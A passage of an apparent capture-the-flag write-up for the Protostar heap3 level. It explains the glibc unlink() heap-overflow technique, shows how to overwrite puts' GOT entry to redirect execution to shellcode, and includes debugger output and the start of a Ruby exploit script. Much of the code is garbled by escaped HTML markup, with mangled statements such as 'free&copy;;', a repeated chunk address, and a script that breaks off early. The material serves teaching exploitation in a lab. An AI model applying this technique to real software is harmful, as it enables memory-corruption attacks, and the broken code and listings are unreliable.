-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="o">&amp;</span><span class="n">copy</span><span class="p">;;</span>
-</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">dynamite</span> <span class="n">failed</span><span class="o">?</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
-</span><span class='line'>__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 &lt;unfinished ...>
-</span><span class='line'>sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
-</span><span class='line'>sbrk(4096)                                                     = 0x0804c000
-</span><span class='line'>sbrk(0)                                                        = 0x0804d000
-</span><span class='line'>strcpy(0x0804c008, &ldquo;1&rdquo;)                                        = 0x0804c008
-</span><span class='line'>strcpy(0x0804c030, &ldquo;2&rdquo;)                                        = 0x0804c030
-</span><span class='line'>strcpy(0x0804c058, &ldquo;3&rdquo;)                                        = 0x0804c058
-</span><span class='line'>puts(&ldquo;dynamite failed?"dynamite failed?
-</span><span class='line'>)                                                              = 17
-</span><span class='line'>+++ exited (status 17) +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We have three chunks at the appropriate addresses:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: a-control
-</span><span class='line'>(32) 0x0804c008: a&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(08) 0x0804c000: b-control
-</span><span class='line'>(32) 0x0804c030: b&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(08) 0x0804c050: c-control
-</span><span class='line'>(32) 0x0804c058: c</span></code></pre></td></tr></table></div></figure></p>
-
-<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
-<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
-explain the exploitation process in detail.</p>
-
-<p>The malloc chunk could be considered as the following structure:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GNU C Library Implementation (used chunk):&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;pre>&lt;code>         +----------------------------------+
-</span><span class='line'>chunk -&gt; | prev_size                        |
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>         | size                         |M|P|
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>  mem -&gt; | data                             |
-</span><span class='line'>         : ...                              :
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>&lt;/code>&lt;/pre>
-</span><span class='line'>
-</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
-</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Once we free() the chunk:&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;pre>&lt;code>         +----------------------------------+
-</span><span class='line'>chunk -&gt; | prev_size                        |
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>         | size                         |M|P|
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>  mem -&gt; | fd                               |
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>         | bk                               |
-</span><span class='line'>         +----------------------------------+
-</span><span class='line'>         | (old memory, can be zero bytes)  |
-</span><span class='line'>         :                                  :
-</span><span class='line'>&lt;/code>&lt;/pre>
-</span><span class='line'>
-</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
-</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
-
-<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
-interested, how is the <code>free()</code> implemented:</p>
-
-<p><figure class='code'><figcaption><span>malloc/malloc.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">..</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">unlink</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">BK</span><span class="p">,</span> <span class="n">FD</span><span class="p">)</span>                                                     <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">{</span>                                                                             \
-</span><span class='line'>  <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                                                                 \
-</span><span class='line'>  <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>                                                                 \
-</span><span class='line'>  <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>                                                                \
-</span><span class='line'>  <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                                                                \
-</span><span class='line'><span class="p">}</span>                                                                             \
-</span><span class='line'><span class="p">..</span>
-</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">backward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
-</span><span class='line'>  <span class="p">{</span>
-</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsz</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">prevsz</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>     <span class="cm">/* keep as last_remainder */</span>
-</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'><span class="k">else</span>
-</span><span class='line'>  <span class="nf">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">forward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
-</span><span class='line'>  <span class="p">{</span>
-</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">nextsz</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">islr</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">next</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>
-</span><span class='line'>                                          <span class="cm">/* re-insert last_remainder */</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">link_last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="k">else</span>
-</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">next</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">set_head</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">);</span>                  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">clear</span> <span class="n">inuse</span> <span class="n">bit</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>
-
-<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
-the address of <code>winner()</code>.</p>
-
-<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
-and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>
-
-<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
-but jumping to our shellcode stored in allocated memory would be efficient.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>gdb> print /x 0x08048864+0x8
-</span><span class='line'>$1 = 0x804886c&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>gdb> maintenance info sections
-</span><span class='line'>Exec file:
-</span><span class='line'>    `/opt/protostar/bin/heap3', file type elf32-i386.
-</span><span class='line'>    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
-</span><span class='line'>    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
-</span><span class='line'>==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
-</span><span class='line'>    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
-</span><span class='line'>    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
-</span><span class='line'>    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
-</span><span class='line'>    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
-</span><span class='line'>    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
-</span><span class='line'>    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
-</span><span class='line'>    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Exploit:</p>
-
-<p><figure class='code'><figcaption><span>exploit-backward.rb </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ objdump -d /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;&amp;hellip;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mi">8048935</span><span class="p">:</span>       <span class="n">e8</span> <span class="mi">56</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">8048790</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="nb">puts</span><span class="vi">@plt</span><span class="o">&gt;&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ objdump -TR /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">R_386_JUMP_SLOT</span><span class="o">.</span><span class="n">*</span> <span class="nb">puts</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;0804b128 R_386_JUMP_SLOT   puts&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">gdb</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="sr">/x 0x0804b128-0x0c&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="vg">$1</span> <span class="o">=</span> <span class="mh">0x804b11c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ nm /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">winner</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;08048864 T winner&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># rasm2 -C &amp;lsquo;push 0x08048864; ret&amp;rsquo;&lt;/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x68</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">x88</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x08</span><span class="p">\</span><span class="n">xc3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">ltrace</span> <span class="o">-</span><span class="n">e</span> <span class="n">strcpy</span> <span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">a</span> <span class="n">b</span> <span class="n">c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;strcpy(0x0804c008, &amp;ldquo;a&amp;rdquo;)                              = 0x0804c008&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">strcpy</span><span class="p">(</span><span class="mh">0x0804c030</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>                              <span class="o">=</span> <span class="mh">0x0804c030</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;strcpy(0x0804c058, &amp;ldquo;c&amp;rdquo;)                              = 0x0804c058&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">gdb</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="sr">/x 0x0804c008 + 0x04&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="vg">$1</span> <span class="o">=</span> <span class="mh">0x804c00c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;binary = &amp;ldquo;/o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
-</span><span class='line'>
